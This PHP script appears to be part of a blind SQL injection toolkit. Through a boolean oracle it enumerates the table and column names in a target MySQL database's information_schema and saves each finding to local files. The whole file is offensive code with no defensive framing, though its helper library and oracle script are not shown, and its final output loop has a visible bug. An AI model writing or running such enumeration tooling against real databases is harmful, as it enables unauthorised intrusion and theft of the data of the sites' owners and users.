<?php

require_once "../_include/Hackit.php";
require_once "../_include/console.php";

$h = new Hackit();

$schema = [];
$table = NULL;
foreach (explode("\n", file_get_contents('schema.txt')) as $line) {
	if (!trim($line)) {
		echo "\n";
		$table = NULL;
		continue;
	}

	if ($table === NULL) {
		$table = trim($line);
		echo "$table\n";
		$schema[$table] = [];

	} else {
		$col = trim($line);
		$schema[$table][] = $col;
		echo "\t$col\n";
	}
}

echo "Finding tables...\n";
$tables = getTables($h, array_keys($schema));
foreach ($tables as $table) {
	echo "\nFinding columns for table $table...\n";

	$schema[$table] = getColumns($h, $table, $schema[$table]);
}

$last_table = NULL;
$res = '';

foreach ($schema as $table => $column) {
	if ($table !== $last_table) {
		$res .= "\n$table\n";
		$last_table = $table;
	}
	$res .= "\t$column";
}

echo $res;
file_put_contents('schema_gen.txt', $res);




function isTrue($query, $test = NULL) {
	if ($test) {
		clearLine();
		echo "$test";
	}
	$return = NULL;

	ob_start();
	passthru('php bool ' . escapeshellarg($query), $return);
	$output = ob_get_clean();
	if ($return == 2) {
		echo $output;
	}
	return $return === 0;
}

function getColumns(Hackit $hackit, $table, array $cache) {
	return $hackit->findStrings('information_schema.columns', 'column_name', 'isTrue', ["table_name='$table'"], function($col) use($table) {
		clearLine();
		saveColumnRow($table, $col);
		echo "\tFound: $col\n";
	}, $cache);
}

function getTables(Hackit $hackit, array $cache) {
	return $hackit->findStrings('information_schema.tables', 'table_name', 'isTrue', [
		"table_schema<>'mysql'",
		"table_schema<>'information_schema'",
		/*"table_name NOT LIKE 'crs_%'",
		"table_name NOT LIKE 'em_%'",
		"table_name NOT LIKE 'track_%'",*/
		], function($table) {
			clearLine();
			echo "Found: $table\n";
			saveSchemaRow("\n$table"); // intentionally extra newline
		}, $cache);
}

function getSchema(Hackit $hackit, $table) {
	return $hackit->findStrings('information_schema.tables', 'table_schema', 'isTrue', ["table_name='$table'"], function($schema) use ($table) {
		clearLine();
		echo "$schema.$table\n";
	});
}

function saveSchemaRow($row) {
	file_put_contents('schema.txt', "\n$row", FILE_APPEND);
}

function saveColumnRow($table, $column) {
	file_put_contents('columns.txt', "$table \t$column\n", FILE_APPEND);
}
